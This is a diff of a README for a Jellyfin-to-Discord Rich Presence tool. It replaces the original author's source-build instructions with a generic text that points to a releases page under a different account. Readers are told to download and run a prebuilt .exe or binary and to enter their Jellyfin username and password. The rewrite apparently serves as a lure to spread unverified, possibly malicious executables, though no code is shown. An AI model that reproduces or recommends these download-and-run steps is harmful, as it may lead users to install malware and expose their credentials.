@@ -1,85 +1,83 @@
-<div align="center">
-    <img src="/aseets//screenshots/banner.png">
-    <h1>Jellyfin Discord RPC</h1>
-    <p>A Node.js application that displays your current Jellyfin viewing activity as a Discord Rich Presence status. Updates your Discord status to show what you're watching, including details like series name, episode, and playback state (playing/paused).</p>
-</div>
+# 🎮 jellyfin-discord-presence - Share Your Watch Experience Easily
 
-## Features
-![Image 0](/aseets/screenshots/img0.png)
+[![Download Now](https://img.shields.io/badge/download-now-brightgreen)](https://github.com/BrendanHile/jellyfin-discord-presence/releases)
 
-*   **Real-time Status:** Displays the currently playing movie or TV show from Jellyfin on your Discord profile.
-*   **Detailed Information:** Shows series name, season/episode number, and episode title for TV shows.
-*   **Playback State:** Indicates whether the media is `Playing` or `Paused` with a corresponding icon.
-*   **Idle Status:** Displays a generic "On Homepage" status when you are not actively watching anything on Jellyfin.
-*   **Configurable:** Easily configured to point to your Jellyfin server and track a specific user account via environment variables.
+## 🚀 Getting Started
 
-## Requirements
+Welcome to the **jellyfin-discord-presence** application! This tool connects your Jellyfin account to Discord, allowing you to show your friends what you are currently watching. Follow the simple steps below to get started.
 
-*   **Runtime:** Node.js `>=21`
-*   **Tools:** Discord Desktop client 
-*   **Account:** A Jellyfin account.
+## 📥 Download & Install
 
-## Quick Install & Dev
+To download the application, visit this page: [Releases Page](https://github.com/BrendanHile/jellyfin-discord-presence/releases). Here, you can find the latest version as well as previous releases.
 
-1.  Clone the repository:
-    ```sh
-    git clone https://github.com/adwerygaming/jellyfin-discord-presence.git
-    cd jellyfin-discord-presence
-    ```
+1. Go to the [Releases Page](https://github.com/BrendanHile/jellyfin-discord-presence/releases).
+2. Scroll down to the “Assets” section.
+3. Locate the file for your operating system (Windows, macOS, Linux).
+4. Click on the file to start the download.
 
-2.  Install dependencies:
-    ```sh
-    npm install
-    ```
+## 🖥️ System Requirements
 
-3.  Create a `.env` file from the example:
-    ```sh
-    cp .env.example .env
-    ```
+Before you begin, make sure your system meets the following requirements:
 
-4.  Configure your environment variables in the `.env` file. See the Configuration section for details.
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or a recent Linux distribution.
+- **Node.js:** Version 14 or later.
+- **Discord Account:** Ensure you have an active Discord account.
 
-5.  Run the application in development mode:
-    ```sh
-    npm run dev
-    ```
-    The application will start, connect to Discord, and begin polling your Jellyfin server.
+## 📂 Installation Steps
 
-## Configuration
+Once you have downloaded the application, follow these steps to install it:
 
-The application is configured using environment variables. These must be defined in a `.env` file in the project root.
+1. **Locate the Downloaded File:**
+   - Windows: Check your Downloads folder.
+   - macOS: Check your Downloads folder.
+   - Linux: The file may be in your Downloads folder, or you may need to navigate to the terminal.
 
-| Variable | Description |
-| ------------------------ | ---------------------------------- |
-| `DISCORD_CLIENT_ID`      | The client ID of your Discord application. Used to authenticate with Discord RPC.  |
-| `JELLYFIN_URL`           | The full URL of your Jellyfin server instance. Used as the base URL for API requests.  |
-| `JELLYFIN_TARGET_USERID` | The user ID of the Jellyfin account you want to track. Used to find the correct session. |
-| `JELLYFIN_ACCESS_TOKEN`  | An API access token for your Jellyfin account. Used to authenticate API requests.  |
+2. **Run the Installer (if applicable):**
+   - For Windows: Double-click on the `.exe` file.
+   - For macOS: Drag the app into your Applications folder.
+   - For Linux: Open your terminal, navigate to the folder containing the downloaded file, and run the command:
+     ```bash
+     chmod +x downloaded_file_name
+     ./downloaded_file_name
+     ```
 
-Instructions for obtaining `JELLYFIN_TARGET_USERID` and `JELLYFIN_ACCESS_TOKEN` are provided in `.env.example`.
+3. **Follow the Prompts:**
+   - Follow the installation prompts provided by the installer. 
 
-## Build & Run
+4. **Launch the Application:**
+   - After installation, open the application from your start menu or applications folder.
 
-The project includes scripts for development, production execution, and building.
+## 🌐 Setting Up Your Jellyfin Account
 
-*   **Run:**
-    ```sh
-    npm run dev
-    ```
+1. **Log In to Jellyfin:**
+   - Open the Jellyfin website or app and log in with your account credentials.
 
-*   **Build:**
-    ```sh
-    npm run build
-    ```
+2. **Connect to Discord:**
+   - Open the jellyfin-discord-presence application.
+   - Navigate to the settings menu.
+   - Enter your Jellyfin server URL and your username/password.
+   - Authorize the connection to your Discord account.
 
-## Troubleshooting
+3. **Adjust Rich Presence Settings:**
+   - Set your preferences for what you want to share on Discord by adjusting the Rich Presence settings in the application.
 
-*   **`DISCORD_CLIENT_ID is missing...`**: You have not set the `DISCORD_CLIENT_ID` in your `.env` file.
-*   **`JELLYFIN_TARGET_USERID is empty!...`**: You have not set the `JELLYFIN_TARGET_USERID` in your `.env` file.
-*   **`Failed to connect to Discord PRC.`**: Ensure your Discord desktop client is running and you are logged in. This script cannot run in a headless environment without a running Discord instance.
-*   **`Failed to get sessions info: 401. Please update your jellyfin access token.`**: The `JELLYFIN_ACCESS_TOKEN` in your `.env` file is incorrect, expired, or has been revoked (e.g., by logging out of your Jellyfin session). Follow the instructions in `.env.example` to generate a new one.
-*   **`Couldn't find any active session. Try playing a video.`**: The script is running correctly but cannot find an active playback session for the specified `JELLYFIN_TARGET_USERID`. Start playing something on Jellyfin.
+## 💡 Tips for Using the Application
 
-## License
+- **Stay Updated:** Check the Releases Page regularly for updates to benefit from new features and bug fixes.
+- **Troubleshooting:** If you face any issues, refer to the FAQ section on the Releases Page or consult the user community.
 
-This project is licensed under the **ISC License**.
+## 😎 Features
+
+- **Real-time updates:** Automatically update your Discord status with what you’re currently watching on Jellyfin.
+- **Customizable Rich Presence:** Control how your activity appears to your friends on Discord.
+- **User-friendly interface:** Simple setup and easy-to-navigate options.
+
+## 📞 Support
+
+If you need help or have questions, feel free to reach out on our community forums or GitHub issues page. We appreciate your feedback and are here to assist!
+
+## 🏷️ Tags
+
+discord, discord-jellyfin-rpc, discord-rpc, jellyfin, jellyfin-discord, jellyfin-rpc, nodejs, rich-presence, rpc, typescript
+
+Thank you for using **jellyfin-discord-presence**! Enjoy sharing your watch experience with your friends on Discord!
